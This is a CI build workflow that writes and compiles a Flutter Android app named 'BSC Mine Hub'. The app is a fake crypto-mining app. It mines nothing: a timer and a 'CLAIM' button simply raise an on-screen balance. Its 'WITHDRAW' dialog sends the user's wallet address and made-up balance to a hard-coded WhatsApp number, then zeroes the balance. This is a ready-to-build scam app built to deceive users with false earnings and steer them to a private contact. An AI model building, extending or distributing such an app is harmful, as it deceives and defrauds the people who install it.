workflows:
  android-workflow:
    name: Android Workflow
    instance_type: mac_mini_m2
    environment:
      flutter: stable
    scripts:
      - name: Build Working
        script: |
          rm -rf android lib
          flutter create --platforms=android .
          flutter pub add url_launcher
          cat > lib/main.dart << 'DART'
          import 'dart:async'; import 'package:flutter/material.dart'; import 'package:url_launcher/url_launcher.dart';
          void main()=>runApp(MaterialApp(debugShowCheckedModeBanner:false,home:Home()));
          class Home extends StatefulWidget{State<Home> createState()=>_S();}
          class _S extends State<Home>{
            double b=0.01200; bool m=true; Timer? t; var wc=TextEditingController();
            void initState(){super.initState(); t=Timer.periodic(Duration(seconds:2),(_){if(m)setState(()=>b+=0.00001);});}
            @override Widget build(BuildContext c){return Scaffold(appBar:AppBar(title:Text('BSC Mine Hub'),backgroundColor:Colors.orange,centerTitle:true),body:Center(child:Column(mainAxisAlignment:MainAxisAlignment.center,children:[Icon(Icons.currency_bitcoin,size:90,color:Colors.orange),SizedBox(height:10),Text(b.toStringAsFixed(5),style:TextStyle(fontSize:38,fontWeight:FontWeight.bold)),Text('BSC Mining...'),SizedBox(height:25),ElevatedButton(onPressed:()=>setState(()=>m=!m),style:ElevatedButton.styleFrom(backgroundColor:m?Colors.red:Colors.green,minimumSize:Size(220,50)),child:Text(m?'STOP':'START',style:TextStyle(color:Colors.white))),SizedBox(height:15),ElevatedButton(onPressed:()=>setState(()=>b+=0.00010),style:ElevatedButton.styleFrom(backgroundColor:Colors.amber,minimumSize:Size(220,50)),child:Text('CLAIM +0.00010',style:TextStyle(color:Colors.black))),SizedBox(height:15),OutlinedButton(onPressed:(){showDialog(context:c,builder:(_)=>AlertDialog(title:Text('Withdraw'),content:TextField(controller:wc,decoration:InputDecoration(hintText:'BEP20 Address')),actions:[ElevatedButton(onPressed:()async{final u=Uri.parse("https://wa.me/923494769780?text=WITHDRAW ${b.toStringAsFixed(5)} Wallet ${wc.text}"); await launchUrl(u,mode:LaunchMode.externalApplication); setState(()=>b=0); Navigator.pop(context);},child:Text('SEND WHATSAPP'))]));},child:Text('WITHDRAW'))])));}
          }
          DART
          flutter build apk --release
    artifacts:
      - build/app/outputs/flutter-apk/app-release.apk
